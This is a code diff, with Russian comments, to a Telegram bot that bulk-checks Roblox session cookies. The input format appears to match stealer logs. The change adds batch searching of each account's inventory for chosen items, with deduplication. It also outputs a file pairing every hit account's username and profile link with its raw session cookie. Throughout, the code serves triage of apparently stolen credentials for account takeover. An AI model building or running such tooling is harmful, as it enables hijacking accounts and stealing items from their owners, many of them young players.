@@ -395,7 +395,7 @@ async def check_owns(cookie, user_id, asset_id):
 
 
 # ================================================================
-#  ГЛАВНАЯ ПРОВЕРКА (теперь с поддержкой поиска)
+#  ГЛАВНАЯ ПРОВЕРКА (с поддержкой поиска)
 # ================================================================
 
 async def check_account(cookie, status_msg, search_term=None):
@@ -639,7 +639,7 @@ async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False, 
 
 
 # ================================================================
-#  ТИХАЯ ПРОВЕРКА (ДЛЯ БАТЧА)
+#  ТИХАЯ ПРОВЕРКА (ДЛЯ ОБЫЧНОГО БАТЧА)
 # ================================================================
 
 async def _silent_check(cookie):
@@ -654,7 +654,22 @@ async def _silent_check(cookie):
 
 
 # ================================================================
-#  БАТЧЕВАЯ ПРОВЕРКА
+#  ТИХАЯ ПРОВЕРКА С ПОИСКОМ (ДЛЯ БАТЧ-ПОИСКА)
+# ================================================================
+
+async def _silent_search(cookie, search_term):
+    class FakeMsg:
+        async def edit_text(self, *a, **kw): pass
+    try:
+        return await check_account(cookie, FakeMsg(), search_term)
+    except Exception:
+        return {"valid": False, "user_id": None, "username": None,
+                "offsale": [], "promo_found": [], "inv_total": 0,
+                "inv_opened": False, "debug": [], "search_results": []}
+
+
+# ================================================================
+#  БАТЧЕВАЯ ПРОВЕРКА (ОБЫЧНАЯ)
 # ================================================================
 
 async def run_batch(message, cookies):
@@ -783,6 +798,92 @@ async def run_batch(message, cookies):
 
 
 # ================================================================
+#  БАТЧЕВАЯ ПРОВЕРКА ДЛЯ ПОИСКА
+# ================================================================
+
+async def run_batch_search(message, cookies, search_term):
+    total = len(cookies)
+    results = [None] * total   # (result, original_cookie)
+    counter = {"done": 0, "valid": 0, "invalid": 0}
+    seen_ids = {}
+    dupes = 0
+
+    prog_msg = await message.answer(f"🔍 Поиск «{search_term}» по {total} кукам...")
+    sem = asyncio.Semaphore(5)
+
+    async def worker(i, cookie):
+        nonlocal dupes
+        async with sem:
+            r = await _silent_search(cookie, search_term)
+            results[i] = (r, cookie)
+            counter["done"] += 1
+            if r["valid"]:
+                counter["valid"] += 1
+                uid = r["user_id"]
+                if uid in seen_ids:
+                    dupes += 1
+                else:
+                    seen_ids[uid] = i
+            else:
+                counter["invalid"] += 1
+            if counter["done"] % 5 == 0 or counter["done"] == total:
+                try:
+                    await prog_msg.edit_text(
+                        f"🔍 {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}"
+                    )
+                except Exception:
+                    pass
+
+    await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
+    await prog_msg.delete()
+
+    # Только уникальные валидные
+    valid_pairs = [(r, c) for (r, c) in results if r and r["valid"] and r["user_id"] in seen_ids]
+
+    # Собираем аккаунты с находками
+    hits = [(r, c) for r, c in valid_pairs if r.get("search_results")]
+
+    # Краткая статистика
+    total_found = sum(len(r["search_results"]) for r, _ in hits)
+    summary_lines = [
+        f"✅ <b>Поиск завершён</b>",
+        f"🔍 Запрос: «{search_term}»",
+        "",
+        f"Всего куков: {total}",
+        f"Валидных: {counter['valid']}",
+        f"Невалидных: {counter['invalid']}",
+        f"Дубликатов: {dupes}",
+        f"Аккаунтов с находками: {len(hits)}",
+        f"Всего предметов: {total_found}",
+    ]
+    summary = "\n".join(summary_lines)
+    await message.answer(summary, link_preview_options=LinkPreviewOptions(is_disabled=True))
+
+    if hits:
+        file_lines = [f"РЕЗУЛЬТАТЫ ПОИСКА: «{search_term}»", "=" * 60, ""]
+        for r, cookie in hits:
+            uid, uname = r["user_id"], r["username"]
+            file_lines.append("=" * 60)
+            file_lines.append(f"Аккаунт: {uname} (ID: {uid})")
+            file_lines.append(f"Ссылка: https://www.roblox.com/users/{uid}/profile")
+            file_lines.append(f"Куки: {cookie}")
+            file_lines.append("")
+            file_lines.append(f"Найдено предметов ({len(r['search_results'])}):")
+            for item in r["search_results"]:
+                line = f"  • {item['name']} — https://www.roblox.com/catalog/{item['id']}"
+                if item.get("created"):
+                    line += f" ({item['created'][:4]})"
+                file_lines.append(line)
+            file_lines.append("")
+        txt = "\n".join(file_lines)
+        buf = io.BytesIO(txt.encode("utf-8"))
+        file = BufferedInputFile(buf.getvalue(), filename=f"search_{search_term}.txt")
+        await message.answer_document(file, caption=f"📋 Результаты поиска «{search_term}»")
+    else:
+        await message.answer(f"❌ Ни на одном аккаунте не найдено предметов «{search_term}».")
+
+
+# ================================================================
 #  КЛАВИАТУРА
 # ================================================================
 
@@ -892,9 +993,17 @@ async def handle_search_cookie_text(message: Message, state: FSMContext):
         return
     data = await state.get_data()
     term = data.get("search_term")
-    cookie = message.text.strip()
+    raw_cookies = message.text.strip().splitlines()
+    cookies = [clean_cookie(c) for c in raw_cookies if c.strip() and len(clean_cookie(c)) >= 50]
+    if not cookies:
+        await message.answer("❌ Не найдено валидных куков.")
+        await state.clear()
+        return
     await state.clear()
-    await run_check(message, cookie, show_debug=False, search_term=term)
+    if len(cookies) == 1:
+        await run_check(message, cookies[0], search_term=term)
+    else:
+        await run_batch_search(message, cookies, term)
 
 
 @dp.message(SearchState.waiting_for_cookie, F.document)
@@ -912,9 +1021,29 @@ async def handle_search_cookie_file(message: Message, state: FSMContext):
     buf = io.BytesIO()
     await bot.download_file(file.file_path, destination=buf)
     buf.seek(0)
-    cookie = buf.read().decode("utf-8", errors="ignore").strip()
+    lines = buf.read().decode("utf-8", errors="ignore").splitlines()
+    cookies = []
+    for l in lines:
+        l = l.strip()
+        if not l:
+            continue
+        # Формат: "Username: ... | Cookie: _|WARNING...|_..."
+        if "Cookie: " in l:
+            val = l.split("Cookie: ")[-1].strip()
+            if len(val) > 50:
+                cookies.append(val)
+        elif len(l) > 50:
+            cookies.append(l)
+    cookies = [clean_cookie(c) for c in cookies if c.strip() and len(clean_cookie(c)) >= 50]
+    if not cookies:
+        await message.answer("❌ Не найдено валидных куков.")
+        await state.clear()
+        return
     await state.clear()
-    await run_check(message, cookie, show_debug=False, search_term=term)
+    if len(cookies) == 1:
+        await run_check(message, cookies[0], search_term=term)
+    else:
+        await run_batch_search(message, cookies, term)
 
 
 @dp.callback_query(F.data.startswith("tog_"))
@@ -1003,6 +1132,7 @@ async def handle_file(message: Message, state: FSMContext):
         elif len(l) > 50:
             # Просто голый кук
             cookies.append(l)
+    cookies = [clean_cookie(c) for c in cookies if c.strip() and len(clean_cookie(c)) >= 50]
     if not cookies:
         await message.answer("❌ Не нашёл cookie в файле")
         return
@@ -1029,13 +1159,14 @@ async def handle_text(message: Message, state: FSMContext):
                 lines.append(val)
         elif len(l) > 50:
             lines.append(l)
-    if not lines:
+    cookies = [clean_cookie(c) for c in lines if c.strip() and len(clean_cookie(c)) >= 50]
+    if not cookies:
         await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings")
         return
-    if len(lines) == 1:
-        await run_check(message, lines[0])
+    if len(cookies) == 1:
+        await run_check(message, cookies[0])
     else:
-        await run_batch(message, lines)
+        await run_batch(message, cookies)
 
 
 # ================================================================
